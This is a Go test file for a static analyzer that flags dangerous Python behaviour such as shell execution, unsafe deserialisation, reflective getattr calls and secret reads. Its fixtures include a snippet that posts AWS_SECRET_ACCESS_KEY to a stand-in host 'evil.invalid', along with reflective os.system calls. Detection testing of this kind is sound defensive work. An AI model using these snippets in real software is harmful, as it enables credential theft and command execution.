package analyzer

import (
	"context"
	"testing"

	"github.com/domehahn/skil/pkg/skil"
)

func TestPythonASTResolvesAliasesAndIgnoresStrings(t *testing.T) {
	source := `import subprocess as sp
from os import system as run
import pickle, requests as http

text = "exec(payload) and subprocess.run(command)"
# eval(payload)
sp.run(["id"])
run("id")
pickle.loads(payload)
http.post(url, data=payload)
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	counts := map[string]int{}
	for _, finding := range findings {
		counts[finding.RuleID]++
	}
	if counts["SKIL-PY-001"] != 0 || counts["SKIL-PY-002"] != 1 || counts["SKIL-PY-003"] != 1 || counts["SKIL-NET-001"] != 1 {
		t.Fatalf("%#v", findings)
	}
}

func TestPythonASTSafeSubprocessCallIsObservedWithoutFinding(t *testing.T) {
	// A static, argv-only subprocess call with no shell=True is legitimate
	// declared-capability usage and must not itself produce a Finding, but
	// verification cannot tell "safely used the capability" apart from
	// "never used it" unless the usage is still recorded as an observation.
	source := "import subprocess\nsubprocess.Popen([\"git\", \"status\", \"--short\"]).wait()\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-002" {
			t.Fatalf("safe argv-only subprocess call must not produce a finding: %#v", findings)
		}
	}
	found := false
	for _, obs := range observations {
		if obs.Capability == "commands.execute" && obs.Value == "git" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected a commands.execute observation for the safe subprocess call: %#v", observations)
	}
}

func TestPythonASTReadOnlyFileOpenIsObservedWithoutFinding(t *testing.T) {
	// Reading a file in the default (read) mode is not itself dangerous and
	// must not produce a Finding, but it is legitimate declared
	// filesystem.read capability usage and must be observable so a
	// contract that declares filesystem.read is not reported overdeclared.
	source := "data = open(\"docs/readme.txt\").read()\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("read-only open() must not produce a finding: %#v", findings)
	}
	found := false
	for _, obs := range observations {
		if obs.Capability == "filesystem.read" && obs.Value == "docs/readme.txt" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected a filesystem.read observation for the read-only open() call: %#v", observations)
	}
}

func TestPythonASTEnvironmentVariableReadIsObservedForBothCapabilities(t *testing.T) {
	// os.getenv reading a named variable is simultaneously secrets.read
	// evidence (the SKIL-SEC-001 finding) and environment.read capability
	// usage, both of which must be independently observable.
	source := "import os\ntoken = os.getenv(\"API_TOKEN\")\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("expected the existing SKIL-SEC-001 finding to still fire: %#v", findings)
	}
	var sawSecrets, sawEnvironment bool
	for _, obs := range observations {
		if obs.Capability == "secrets.read" && obs.Value == "API_TOKEN" {
			sawSecrets = true
		}
		if obs.Capability == "environment.read" && obs.Value == "API_TOKEN" {
			sawEnvironment = true
		}
	}
	if !sawSecrets || !sawEnvironment {
		t.Fatalf("expected both secrets.read and environment.read observations: %#v", observations)
	}
}

// TestPythonASTSecretUsedOnlyForAuthenticationIsSafe is a regression test
// for issue #34 (benchmark/corpus/development/bench-010): a token read from
// the environment and used only as the Authorization header of a single,
// fixed-destination GET call — the shape every legitimate authenticated API
// client has — must not fire SKIL-SEC-001. The capability must still be
// observable (see the CapabilityObservation loop below), only the Finding
// is suppressed.
func TestPythonASTSecretUsedOnlyForAuthenticationIsSafe(t *testing.T) {
	source := "import os\nimport requests\n\n" +
		"token = os.environ[\"GITHUB_TOKEN\"]\n" +
		"response = requests.get(\n" +
		"    \"https://api.github.com/repos/example-org/example-repo/pulls\",\n" +
		"    headers={\"Authorization\": f\"Bearer {token}\"},\n" +
		")\n"
	findings, observations, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("a credential used only as an Authorization header on a fixed-destination GET must not fire SKIL-SEC-001: %#v", findings)
	}
	found := false
	for _, obs := range observations {
		if obs.Capability == "secrets.read" {
			found = true
		}
	}
	if !found {
		t.Fatalf("authentication-only credential usage must still be observed as secrets.read: %#v", observations)
	}
}

// TestPythonASTCredentialExfiltrationStillDetected guards the other side of
// the same fix: a credential that reaches a second, unrelated sink (here,
// a POST with the secret in the body to a different destination) must
// still fire SKIL-SEC-001 — the authentication-only guard must not become
// a general bypass for real exfiltration.
func TestPythonASTCredentialExfiltrationStillDetected(t *testing.T) {
	source := "import os\nimport requests\n\n" +
		"secret = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\n" +
		"requests.post(\"https://evil.invalid/collect\", data={\"secret\": secret})\n"
	findings, _, err := NewPythonAST().AnalyzeCapabilities(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if !hasRule(findings, "SKIL-SEC-001") {
		t.Fatalf("expected credential exfiltration to still fire SKIL-SEC-001: %#v", findings)
	}
}

func TestPythonASTDynamicGetattrAndWriteMode(t *testing.T) {
	source := "name = input()\ngetattr(target, name)()\nopen('safe.txt', 'r')\nopen('out.txt', mode='w')\n"
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 2 {
		t.Fatalf("%#v", findings)
	}
}

func TestPythonASTReflectiveGetattrSink(t *testing.T) {
	source := `import os as operating
import builtins as bi

getattr(operating, "system")("id")
getattr(operating, "execvp")("id", ["id"])
getattr(bi, "exec")(payload)
getattr(os, "path")
getattr(helper, "render")()
getter = getattr(os, "system")
text = "getattr(os, 'system')('id')"
`
	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("run.py", source)})
	if err != nil {
		t.Fatal(err)
	}
	var ast9 []skil.Finding
	for _, finding := range findings {
		if finding.RuleID == "SKIL-PY-REFLECT-EXEC" {
			ast9 = append(ast9, finding)
		}
	}
	if len(ast9) != 3 {
		t.Fatalf("reflective execution findings = %d, want 3: %#v", len(ast9), findings)
	}
	for _, finding := range ast9 {
		if finding.Evidence["capability"] != "commands.execute" {
			t.Fatalf("missing command capability evidence: %#v", finding)
		}
	}
}
